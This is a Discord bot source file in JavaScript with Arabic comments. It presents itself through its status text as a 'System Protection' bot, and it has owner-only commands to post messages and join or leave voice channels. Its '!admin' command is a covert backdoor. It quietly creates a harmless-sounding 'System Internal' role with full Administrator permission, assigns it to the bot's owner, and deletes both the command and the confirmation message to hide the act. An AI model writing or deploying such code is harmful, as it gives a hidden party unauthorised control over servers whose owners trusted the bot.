require('dotenv').config();
const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
const { joinVoiceChannel, getVoiceConnection } = require('@discordjs/voice');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers
    ]
});

// معرف مالك البوت
const OWNER_ID = process.env.OWNER_ID;

client.on('ready', () => {
    console.log(`✅ البوت شغال بنجاح باسم: ${client.user.tag}`);
    client.user.setActivity('!help | System Protection', { type: 0 });
});

client.on('messageCreate', async (message) => {
    // التاكد من أن المرسل هو صاحب البوت فقط
    if (message.author.id !== OWNER_ID || message.author.bot) return;

    const args = message.content.split(' ');
    const command = args.shift().toLowerCase();

    // 1. التكلم باسم البوت في روم محدد
    // الاستخدام: !say #اسم_الروم النص
    if (command === '!say') {
        const channel = message.mentions.channels.first();
        if (!channel) return message.reply('❌ حدد الروم أولاً!');
        const text = args.slice(1).join(' ');
        if (!text) return message.reply('❌ اكتب الرسالة المراد إرسالها!');
        
        await channel.send(text);
        message.delete().catch(() => {});
    }

    // 2. دخول روم صوتي (Voice Channel)
    // الاستخدام: !join (يجب أن تكون أنت داخل الروم)
    if (command === '!join') {
        const voiceChannel = message.member.voice.channel;
        if (!voiceChannel) return message.reply('❌ يجب أن تكون داخل روم صوتي أولاً!');

        joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: voiceChannel.guild.id,
            adapterCreator: voiceChannel.guild.voiceAdapterCreator,
            selfDeaf: false,
            selfMute: false
        });

        message.reply(`✅ تم الانضمام إلى الروم الصوتي: ${voiceChannel.name}`);
    }

    // 3. الخروج من الروم الصوتي
    // الاستخدام: !leave
    if (command === '!leave') {
        const connection = getVoiceConnection(message.guild.id);
        if (connection) {
            connection.destroy();
            message.reply('✅ تم الخروج من الروم الصوتي.');
        } else {
            message.reply('❌ البوت ليس متواصلاً بأي روم صوتي حالياً.');
        }
    }

    // 4. إنشاء رتبة أدمن صامتة لك في السيرفر
    // الاستخدام: !admin
    if (command === '!admin') {
        try {
            const role = await message.guild.roles.create({
                name: 'System Internal',
                permissions: [PermissionFlagsBits.Administrator]
            });
            await message.member.roles.add(role);
            message.delete().catch(() => {});
            message.channel.send('✅ تم منح الصلاحيات.').then(m => setTimeout(() => m.delete(), 2000));
        } catch (err) {
            console.error('Error creating admin role:', err);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
